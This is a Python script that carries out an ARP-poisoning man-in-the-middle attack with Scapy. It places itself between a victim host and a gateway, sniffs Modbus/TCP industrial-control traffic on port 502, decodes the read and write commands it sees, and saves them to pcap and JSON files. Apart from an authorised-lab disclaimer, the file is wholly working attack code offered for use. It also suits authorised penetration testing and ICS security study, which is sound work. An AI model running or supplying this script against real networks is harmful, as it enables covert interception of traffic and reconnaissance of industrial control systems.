#!/usr/bin/env python3
"""
ARP MITM using Scapy — for use on networks you own or are explicitly
authorized to test (e.g. a home lab). Poisons the ARP caches of a
victim and a gateway so traffic between them flows through this host.

Requires: enabling IP forwarding on this machine, e.g.
    sudo sysctl -w net.ipv4.ip_forward=1
and running with raw-socket privileges (root, or CAP_NET_RAW).
"""

import sys
import time
import json
import threading
from scapy.all import ARP, Ether, IP, TCP, srp, sendp, sniff, wrpcap
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse


def get_mac(ip, iface, timeout=2):
    """Resolve the MAC address for a given IP via ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = srp(packet, timeout=timeout, iface=iface, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(target_ip, target_mac, impersonate_ip, iface):
    """
    Send a spoofed ARP reply to target_ip claiming that impersonate_ip
    is at our own MAC. Built as a full Ether/ARP frame and sent with
    sendp() (layer 2) so the Ethernet destination MAC is set explicitly —
    using send() (layer 3) here leaves that field unset and triggers
    Scapy's "should be providing the Ethernet destination MAC" warning.
    """
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip)
    sendp(ether / arp, iface=iface, verbose=False)


def restore(dest_ip, dest_mac, src_ip, src_mac, iface):
    """Send the correct ARP mapping to undo poisoning on exit."""
    ether = Ether(dst=dest_mac)
    arp = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    sendp(ether / arp, iface=iface, count=4, verbose=False)


_captured_packets = []
_decoded_log = []
_stop_sniff = threading.Event()

# Modbus function codes, grouped for quick classification.
# (Reference only — nothing here alters or forwards traffic.)
_READ_CODES = {0x01, 0x02, 0x03, 0x04, 0x07}
_WRITE_CODES = {0x05, 0x06, 0x0F, 0x10, 0x16}


def handle_modbus_packet(pkt):
    """
    Read-only decode of a sniffed Modbus/TCP packet into a structured
    record: MBAP header fields plus whatever the function-specific PDU
    fields are (address, quantity, value, etc.), pulled generically via
    pdu.fields_desc rather than hardcoding field names per function code
    — so this doesn't drift if the contrib module's field names differ
    slightly across Scapy versions.
    """
    if not (pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)):
        return

    _captured_packets.append(pkt)

    adu = pkt[ModbusADURequest] if pkt.haslayer(ModbusADURequest) else pkt[ModbusADUResponse]
    pdu = pkt.lastlayer()  # most specific dissected layer, e.g. a Read/Write PDU

    fields = {f.name: getattr(pdu, f.name) for f in pdu.fields_desc}
    func_code = fields.get("funcCode")
    category = (
        "WRITE" if func_code in _WRITE_CODES else
        "READ" if func_code in _READ_CODES else
        "OTHER"
    )

    record = {
        "time": time.time(),
        "src": pkt[IP].src if pkt.haslayer(IP) else None,
        "dst": pkt[IP].dst if pkt.haslayer(IP) else None,
        "unit_id": getattr(adu, "unitId", None),
        "transaction_id": getattr(adu, "transId", None),
        "pdu_type": pdu.__class__.__name__,
        "category": category,
        "fields": fields,
    }
    _decoded_log.append(record)

    print(
        f"[{category:<5}] {record['src']:>15} -> {record['dst']:<15} "
        f"unit={record['unit_id']} {record['pdu_type']}: {fields}"
    )


def dump_decoded_log(path):
    """Write the structured decode log out as JSON Lines for later analysis."""
    with open(path, "w") as f:
        for record in _decoded_log:
            f.write(json.dumps(record, default=str) + "\n")


def start_capture(iface):
    """
    Sniff Modbus/TCP traffic (port 502) until _stop_sniff is set.
    Runs in its own thread alongside the ARP poisoning loop. If you
    already have a callback in your toolkit's sniffer module, swap
    handle_modbus_packet for that instead of duplicating parsing logic.
    """
    sniff(
        iface=iface,
        filter="tcp port 502",
        prn=handle_modbus_packet,
        stop_filter=lambda p: _stop_sniff.is_set(),
        store=False,
    )


def arp_mitm(victim_ip, gateway_ip, iface, interval=2, pcap_out=None, decoded_log_out=None):
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not victim_mac or not gateway_mac:
        print("Could not resolve one or both MAC addresses. Aborting.")
        sys.exit(1)

    print(f"Victim  {victim_ip} is at {victim_mac}")
    print(f"Gateway {gateway_ip} is at {gateway_mac}")
    print("Starting ARP poisoning + Modbus capture. Ctrl+C to stop and restore tables.")

    capture_thread = threading.Thread(target=start_capture, args=(iface,), daemon=True)
    capture_thread.start()

    try:
        while True:
            spoof(victim_ip, victim_mac, gateway_ip, iface)
            spoof(gateway_ip, gateway_mac, victim_ip, iface)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nStopping capture and restoring ARP tables...")
        _stop_sniff.set()
        capture_thread.join(timeout=5)

        if pcap_out and _captured_packets:
            wrpcap(pcap_out, _captured_packets)
            print(f"Saved {len(_captured_packets)} packets to {pcap_out}")

        if decoded_log_out and _decoded_log:
            dump_decoded_log(decoded_log_out)
            print(f"Saved {len(_decoded_log)} decoded records to {decoded_log_out}")

        restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
        print("Done.")


if __name__ == "__main__":
    # Example values — replace with your lab's actual addresses/interface.
    VICTIM_IP = "192.168.1.50"
    GATEWAY_IP = "192.168.1.1"
    IFACE = "eth0"
    PCAP_OUT = "modbus_capture.pcap"
    DECODED_LOG_OUT = "modbus_decoded.jsonl"

    arp_mitm(VICTIM_IP, GATEWAY_IP, IFACE, pcap_out=PCAP_OUT, decoded_log_out=DECODED_LOG_OUT)